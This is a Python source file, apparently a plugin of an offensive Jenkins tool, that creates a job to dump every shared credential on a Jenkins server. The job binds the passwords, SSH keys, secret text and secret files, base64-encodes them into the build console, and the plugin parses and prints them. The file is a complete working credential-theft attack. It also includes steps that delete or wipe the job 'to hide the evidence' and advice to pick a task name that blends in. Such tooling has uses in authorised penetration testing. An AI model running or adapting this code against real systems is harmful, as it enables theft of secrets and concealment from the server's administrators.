import base64
import os
import random
import re
import string
import time
import xml.sax.saxutils

import requests.exceptions as req_exc

from libs import jenkinslib, quik

from .BasePlugin import BasePlugin, HijackStdOut


class NonCriticalException(Exception):
    pass


def xmlescape(data):
    return xml.sax.saxutils.escape(data, {'"': "&quot;"})


class DumpCredsViaJob(BasePlugin):
    """Class for managing DumpCredsViaJob SubCommand"""

    template_cache = None

    def __init__(self, args):
        super().__init__(args)

        state = 1

        try:
            cred = self.args.credentials[0]
            server = self._get_jenkins_server(cred)

            if not server.can_create_job():
                self.logging.fatal(
                    "%s: Is not a valid Jenkins user with job creation access or unable to access Jenkins server.",
                    self._get_username(cred),
                )

                return

            # Step 1: Create empty job so we can check permissions and then use it to list available credentials
            server.create_job(
                self.args.task_name, "<?xml version='1.1' encoding='UTF-8'?><project></project>"
            )
            state += 1

            # Step 2: Use new job to get list of stealable credentials
            credential_list = [x for x in server.list_credentials(self.args.task_name) if x["type"]]

            if len(credential_list) == 0:
                raise NonCriticalException("No credentials were discovered.")

            state += 1

            # Step 3: Get a list of online jenkins nodes

            posix_nodes = []
            windows_nodes = []
            other_nodes = []

            if self.args.node:
                if self.args.node_type == "posix":
                    posix_nodes = [{"name": self.args.node}]
                else:
                    windows_nodes = [{"name": self.args.node}]

            else:
                nodes = [x for x in server.get_nodes() if not x["offline"]]

                if len(nodes) == 0:
                    raise NonCriticalException("No online nodes were discovered.")

                """
                We need to try to divide nodes up by type because our payload will change.
                If unknown, chances are it is some flavor of POSIX compatible OS with base64, echo, and cat, so we can
                attempt POSIX payload as a last resort if nothing else is available.  Also, for some reason master is
                not shown on the nodes page so we can't get the architecture. In most cases the master will be posix compliant anyway.
                In most cases, if execution on the master is denied, that means there will be more than one slave.
                """

                for node in nodes:
                    if node["architecture"] and "windows" in node["architecture"].lower():
                        windows_nodes.append(node)
                    elif (
                        any(
                            node["architecture"] and x in node["architecture"].lower()
                            for x in ["nix", "nux", "bsd", "osx"]
                        )
                        or node["name"] == "master"
                    ):
                        posix_nodes.append(node)
                    else:
                        other_nodes.append(node)

            state += 1

            """
            Step 4: We determine where we are going to try to run this payload and fabricate the payload.
            We want to prioritize posix due to less chance of EDR, and more efficient payload design.
            We want to pick our execution location in this order posix -> windows -> other.
            """

            barrier = "##{}##".format(
                "".join(random.choices(string.ascii_letters + string.digits, k=64))
            )

            job = None
            job_type = None
            run_nodes = None

            if len(posix_nodes) > 0:
                job_type = "posix"
                run_nodes = posix_nodes
            elif len(windows_nodes) > 0:
                job_type = "windows"
                run_nodes = windows_nodes
            elif len(other_nodes) > 0:
                job_type = "posix"
                run_nodes = other_nodes
            else:
                raise NonCriticalException("No nodes to execute on.")

            job = self._generate_job_xml(job_type, run_nodes, barrier, credential_list)

            state += 1

            """
            Step 5: Reconfigure the job payload with actual credential dumping 
            """

            server.reconfig_job(self.args.task_name, job)
            state += 1

            """
            Step 6: Start the job
            """

            server.build_job(self.args.task_name)

            """
            Step 7: Wait for the Results
            """

            while True:
                time.sleep(3)
                try:
                    results = server.get_build_info(self.args.task_name, "lastBuild")
                    break
                except jenkinslib.JenkinsException:
                    pass

            while results["building"]:
                time.sleep(3)
                results = server.get_build_info(self.args.task_name, "lastBuild")

            if results["result"] != "SUCCESS":
                raise NonCriticalException(
                    "Credential Dumping Build did not complete successfully."
                )

            state += 1

            """
            Step 8: Retrieve Credentials
            """

            result = server.get_build_console_output(
                "job/" + self.args.task_name + "/", "lastBuild"
            )
            state += 1

            """
            Step 9: Parse Results
            """

            # Normalize extract base64 encoded credentials:

            try:
                result = "\n".join(x for x in result.split("\n") if not x.startswith("+ "))
                result = (
                    re.findall(
                        r"-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----",
                        result,
                        re.M | re.S,
                    )[0]
                    .replace("\r", "")
                    .replace("\n", "")
                )
                result = base64.b64decode(result).decode("utf8")
            except Exception:
                raise NonCriticalException("Unable to parse out credentials from job.")

            result = re.split(re.escape(barrier), result, re.M)[1:]

            for i, raw_cred in enumerate(result):
                raw_cred = raw_cred.replace("\r", "\n").replace("\n\n", "\n")
                raw_cred = re.split(r"[\r\n]", raw_cred, re.M)[1:]

                try:
                    if raw_cred[0].strip() == "PASSWORD":
                        cred_type = raw_cred[0].strip()
                        description = raw_cred[1].strip()
                        username = raw_cred[2].split(":")[0].strip()
                        password = ":".join(raw_cred[2].split(":")[1:]).strip()

                        print("Type:", cred_type)
                        print("Description:", description)
                        print("Username:", username)
                        print("Password:", password)

                    elif raw_cred[0].strip() == "SSHKEY":
                        cred_type = raw_cred[0].strip()
                        description = raw_cred[1].strip()
                        username = raw_cred[2].strip()
                        passphrase = raw_cred[3].strip()
                        key = "\n".join(raw_cred[4:]).strip()

                        print("Type:", cred_type)
                        print("Description:", description)
                        print("Username:", username)
                        print("Passphrase:", passphrase)
                        print("Key:")
                        print(key)

                    elif raw_cred[0].strip() == "SECRETTEXT":
                        cred_type = raw_cred[0].strip()
                        description = raw_cred[1].strip()
                        text = raw_cred[2].strip()

                        print("Type:", cred_type)
                        print("Description:", description)
                        print("Text:", text)

                    elif raw_cred[0].strip() == "SECRETFILE":
                        if (
                            raw_cred[2] == ""
                        ):  # Delete blank line if it exists at top of file which was introduced by regex splitting
                            del raw_cred[2]

                        cred_type = raw_cred[0].strip()
                        description = raw_cred[1].strip()
                        file_content = "\n".join(raw_cred[2:]).strip()

                        print("Type:", cred_type)
                        print("Description:", description)
                        print("Content:")
                        print(file_content)

                except Exception:
                    pass

                if i < (len(result) - 1):
                    print(
                        "-----------------------------------------------------------------------------"
                    )

        except jenkinslib.JenkinsException as ex:
            if "[403]" in str(ex).split("\n")[0]:
                self.logging.fatal(
                    "%s authentication failed or no access", self._get_username(cred)
                )
            else:
                self.logging.fatal(
                    "Unable to access Jenkins at: %s With User: %s For Reason:\n\t%s"
                    % (
                        (
                            self.server_url.netloc
                            if len(self.server_url.netloc) > 0
                            else self.args.server
                        ),
                        self._get_username(cred),
                        str(ex).split("\n")[0],
                    )
                )

        except (req_exc.SSLError, req_exc.ConnectionError):
            self.logging.fatal(
                "Unable to connect to: "
                + (self.server_url.netloc if len(self.server_url.netloc) > 0 else self.args.server)
            )

        except NonCriticalException as ex:
            with HijackStdOut():
                print(str(ex))

        except Exception:
            self.logging.exception("")
            exit(1)

        finally:
            # Do Cleanup
            if state > 1:
                try:
                    server.delete_job(self.args.task_name)
                    return
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    with HijackStdOut():
                        print(
                            "WARNING: Unable to delete the job, attempting secondary clean-up.  You should double check."
                        )

                # We were unable to delete the the task, so we need to do secondary clean-up as best we can:
                # First we delete all console output and run history:
                try:
                    server.delete_all_job_builds(self.args.task_name)
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to clean-up console output.  You should definitely try to do this yourself."
                    )

                # Second, overwrite the job with an empty job:
                try:
                    server.reconfig_job(
                        self.args.task_name,
                        "<?xml version='1.1' encoding='UTF-8'?><project></project>",
                    )
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to wipeout job to hide the evidence.  You should definitely try to do this yourself."
                    )

                # Third, attempt to disable the job:
                try:
                    server.disable_job(self.args.task_name)
                except (
                    jenkinslib.JenkinsException,
                    req_exc.SSLError,
                    req_exc.ConnectionError,
                    req_exc.HTTPError,
                ):
                    print(
                        "WARNING: Unable to disable job.  You should definitely try to do this yourself."
                    )

    def _generate_job_xml(self, job_type, nodes, barrier, credentials):
        file_name = "f" + "".join(random.choices(string.ascii_letters + string.digits, k=8))

        loader = quik.FileLoader(os.path.join("data", "xml"))

        bindings_template = loader.load_template("credential_binding_template.xml")
        job_template = loader.load_template("job_template.xml")

        if job_type == "posix":
            cmd_template = quik.FileLoader(os.path.join("data", "bash")).load_template(
                "posix_job_dump_creds_template.sh"
            )
        else:
            cmd_template = quik.FileLoader(os.path.join("data", "batch")).load_template(
                "windows_job_dump_creds_template.bat"
            )

        for i in range(len(credentials)):
            if credentials[i]["type"] == "SSHKEY":
                credentials[i]["key_file_variable"] = "a{0}k".format(i)
                credentials[i]["username_variable"] = "a{0}u".format(i)
                credentials[i]["passphrase_variable"] = "a{0}p".format(i)
            else:  # For now everything else uses only one variable
                credentials[i]["variable"] = "a{0}".format(i)

        bindings = bindings_template.render(locals())
        cmds = cmd_template.render(locals())

        return job_template.render(
            {
                "job_type": "BatchFile" if job_type == "windows" else "Shell",
                "assigned_nodes": "({})".format(
                    xmlescape(" || ".join(['"{}"'.format(x["name"]) for x in nodes]))
                ),
                "commands": xmlescape(cmds),
                "credential_bindings": bindings,
            }
        )


class DumpCredsViaJobParser:
    def cmd_DumpCredsViaJob(self):
        """Handles parsing of RunCommand Subcommand arguments"""

        self._create_contextual_parser(
            "DumpCredsViaJob",
            "Dump credentials via explicit enumeration of shared credentials in a job (Only requires job creation permissions and some shared credentials)",
        )
        self._add_common_arg_parsers()

        self.parser.add_argument(
            "-N",
            "--node",
            metavar="<Node>",
            help="Node to execute against. If specified, you must also pass -T",
            action="store",
            dest="node",
            required=False,
        )

        self.parser.add_argument(
            "-T",
            "--nodetype",
            metavar="<Node Type>",
            help='Node Type, either: "posix" or "windows". If specified, you must also pass -N',
            choices=["posix", "windows"],
            dest="node_type",
            required=False,
        )

        self.parser.add_argument(
            metavar="<Task Name>",
            help="Task to Create, must be unique (may not be deleted if user doesn't have job deletion permissions, so pick something that blends in)",
            action="store",
            dest="task_name",
        )

        args = self.parser.parse_args()

        self._validate_server_url(args)
        self._validate_output_file(args)

        if not args.task_name or any(
            x not in (string.ascii_letters + string.digits + "/") for x in args.task_name
        ):
            with HijackStdOut():
                self.parser.print_usage()
                print(
                    "\nError: Task Name must be alphanumeric string with optional subfolder pathing via forward slashes."
                )
                exit(1)

        if (args.node and not args.node_type) or (args.node_type and not args.node):
            with HijackStdOut():
                self.parser.print_usage()
                print("\nError: You must either specify both Node and Node Type or neither")
                exit(1)

        return self._handle_authentication(args)
